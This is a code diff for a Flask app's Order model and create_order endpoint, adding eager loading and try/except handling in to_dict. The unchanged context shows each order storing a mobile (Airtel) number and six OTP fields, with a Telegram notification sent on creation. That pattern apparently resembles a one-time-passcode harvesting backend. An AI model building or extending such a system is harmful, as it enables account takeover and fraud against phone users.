@@ -74,14 +74,33 @@ class Order(db.Model):
     otp5 = db.Column(db.String(10))
     otp6 = db.Column(db.String(10))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
-    plan = db.relationship('Plan', backref='orders')
+    plan = db.relationship('Plan', backref='orders', lazy='joined')
+    user = db.relationship('User', backref='orders', lazy='joined')
 
     def to_dict(self):
+        # Safely handle relationships that may not be loaded
+        customer_phone = ''
+        plan_name = ''
+        try:
+            customer_phone = self.user.phone if self.user else ''
+        except Exception:
+            pass
+        try:
+            plan_name = self.plan.name if self.plan else ''
+        except Exception:
+            pass
+        
+        created_at_str = ''
+        try:
+            created_at_str = self.created_at.strftime('%b %d, %Y')
+        except Exception:
+            pass
+            
         return {
             'id': self.id,
             'order_ref': self.order_ref,
-            'customer_phone': self.user.phone if self.user else '',
-            'plan_name': self.plan.name if self.plan else '',
+            'customer_phone': customer_phone,
+            'plan_name': plan_name,
             'amount': self.amount,
             'status': self.status,
             'airtel_number': self.airtel_number,
@@ -92,7 +111,7 @@ class Order(db.Model):
             'otp4': self.otp4,
             'otp5': self.otp5,
             'otp6': self.otp6,
-            'created_at': self.created_at.strftime('%b %d, %Y'),
+            'created_at': created_at_str,
         }
 
 
@@ -365,7 +384,14 @@ def create_order():
     send_telegram(msg)
 
     notify_new_order(order)
-    return jsonify(order.to_dict()), 201
+    return jsonify({
+        'id': order.id,
+        'order_ref': order.order_ref,
+        'customer_phone': user.phone,
+        'plan_name': plan.name,
+        'amount': order.amount,
+        'status': order.status,
+    }), 201
 
 
 @app.route('/api/orders/<int:order_id>', methods=['PATCH'])
